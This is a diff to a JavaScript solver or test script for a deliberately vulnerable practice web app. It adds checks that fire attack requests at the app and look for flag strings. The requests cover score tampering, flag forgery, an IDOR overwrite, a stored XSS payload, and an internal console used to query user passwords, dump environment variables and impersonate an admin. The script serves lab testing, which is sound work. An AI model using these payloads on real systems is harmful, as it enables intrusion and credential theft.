@@ -259,6 +259,22 @@ ok(71, 'gql_batch_privesc', (await txt('/graphql', J({ query: 'mutation { a:mint
 // 72 internal docs exposed (.gitignore mis-scoped -> served under public/)
 ok(72, 'internal_docs', (await txt('/internal/juicysec/2026-08-quarterly.md')).body.includes('lj_internal_docs_exposed'));
 
+// ─────────────────────── v12 HACK THE SCOREBOARD ───────────────────────
+const P = (o) => ({ method: 'POST', headers: { 'content-type': 'application/json', 'x-player': 'grader' }, body: JSON.stringify(o) });
+ok('S1', 'scoreboard_score_tamper', (await txt('/api/score/set', P({ player: 'grader', score: 9999 }))).body.includes('lj_scoreboard_score_tamper'));
+ok('S2', 'scoreboard_flag_forgery', (await txt('/api/score/claim', P({ player: 'grader', flag: 'FLAG{lj_black_team}' }))).body.includes('lj_scoreboard_flag_forgery'));
+ok('S3', 'scoreboard_idor', (await txt('/api/score/set', { method: 'POST', headers: { 'content-type': 'application/json', 'x-player': 'attacker' }, body: JSON.stringify({ player: 'victim', score: 1 }) })).body.includes('lj_scoreboard_idor_overwrite'));
+ok('S4', 'scoreboard_xss', (await txt('/api/score/claim', P({ player: 'grader', name: '<img src=x onerror=1>' }))).body.includes('lj_scoreboard_stored_xss'));
+// punchline: grader fraudulently at 100% but server emitted nothing → verify catches it
+ok('S5', 'scoreboard_pwned', (await txt('/api/score/verify?player=grader')).body.includes('lj_scoreboard_pwned'));
+
+// ─────────────────────── v13 JUICYOPS INTERNAL CONSOLE ───────────────────────
+const E = (o) => ({ method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(o) });
+ok('I1', 'internal_console_exposed', (await txt('/internal/console')).body.includes('lj_internal_console_exposed'));
+ok('I2', 'internal_sql', (await txt('/api/internal/exec', E({ cmd: 'sql', arg: 'SELECT password FROM users WHERE id=1' }))).body.includes('lj_internal_sql_console'));
+ok('I3', 'internal_env', (await txt('/api/internal/exec', E({ cmd: 'env' }))).body.includes('lj_internal_env_dump'));
+ok('I4', 'internal_impersonate', (await txt('/api/internal/exec', E({ cmd: 'su', arg: 'admin@leakyjuice.com' }))).body.includes('lj_internal_impersonation'));
+
 const passed = results.filter((r) => r.pass).length;
 for (const r of results) console.log(`${r.pass ? '✅' : '❌'}  #${String(r.id).padStart(2)}  ${r.name}`);
 console.log(`\n${passed}/${results.length} challenges captured.`);
